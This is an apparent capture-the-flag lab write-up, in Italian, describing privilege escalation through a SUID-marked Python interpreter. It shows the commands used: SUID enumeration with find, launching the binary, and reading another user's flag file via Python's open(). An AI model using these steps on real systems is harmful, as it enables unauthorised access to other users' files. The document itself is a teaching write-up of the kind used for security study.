```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x04 · "misplaced power"
 ========================================================================

   target ..: phantom-04  "Misplaced Power"
   class ...: privesc / SUID interpreter (python)
   tools ...: find · file · python3 REPL
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> un interprete general-purpose con bit SUID: cosa che non dovrebbe mai
> esistere. non è di root, è di un utente che legge più di te. lo trovi,
> lo lanci, e sei lui.

## ----[ 0x00 · intel ]----

Il brief: sul sistema c'è un interprete general-purpose con SUID. Non è di
root ma di un utente che può leggere più dati di te. Enumerare i SUID,
capire quale è fuori posto, e usarlo per leggere la flag di quell'utente.

## ----[ 0x01 · recon ]----

Un tentativo di eseguire il binario sospetto come modulo Python fallisce
in modo rivelatore: errore di sintassi su byte non validi come sorgente —
è un ELF compilato (l'header ELF non è codice Python). L'enumerazione dei
SUID conferma: uno (`-rwsr-x---`) è di un account non di sistema e di un
gruppo che coincide con l'utente corrente, anomalo rispetto agli altri
(tutti di `root`). `file` conferma: vero ELF SUID, non uno script.
Eseguendolo si apre una REPL Python 3 con l'EUID del proprietario.

## ----[ 0x02 · il difetto ]----

Classico **SUID su interprete general-purpose**: un binario che incapsula
Python completo, marcato SUID ed eseguibile da un gruppo. Python ha
accesso completo alle syscall via `os` e simili, quindi chi lo lancia
ottiene di fatto una shell con l'EUID del proprietario, bypassando le
restrizioni sui suoi file.

Principio generale (GTFOBins per `python`/`python3`): qualunque interprete
general-purpose con SUID = privesc completa verso il proprietario, perché
esegue codice arbitrario (lettura file, `os.system`, spawn shell) con
l'UID effettivo ereditato dal SUID.

## ----[ 0x03 · exploit ]----

1. Tentativo fallito che rivela l'ELF:

```bash
python3 /usr/local/bin/<nome_binario_suid>
```

2. Enumerazione dei SUID per trovare l'anomalia:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

3. Verifica del tipo:

```bash
file /usr/local/bin/<nome_binario_suid>
```

4. Esecuzione → REPL Python coi privilegi del proprietario:

```bash
/usr/local/bin/<nome_binario_suid>
```

5. Dentro la REPL, si localizza la flag dell'utente target:

```python
>>> import os
>>> os.system("find / -user <utente_target> -ls 2>/dev/null")
```

6. Leggerla con `os.system("cat ...")` fallisce (la subshell non mantiene
   lo stesso contesto privilegiato per quel file).

7. La lettura nativa con `open()`, che opera con l'EUID del processo
   Python (ereditato dal SUID), riesce:

```python
>>> print(open("<percorso_file_flag>").read())
```

## ----[ 0x04 · loot ]----

Flag letta dall'interprete SUID: `open()` dall'interno del processo con
l'EUID del proprietario bypassa i permessi, mentre `os.system()` no
(valore fuori dal writeup). Lezione: un interprete SUID è una shell
privilegiata travestita — e `open()` nativo batte la subshell.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
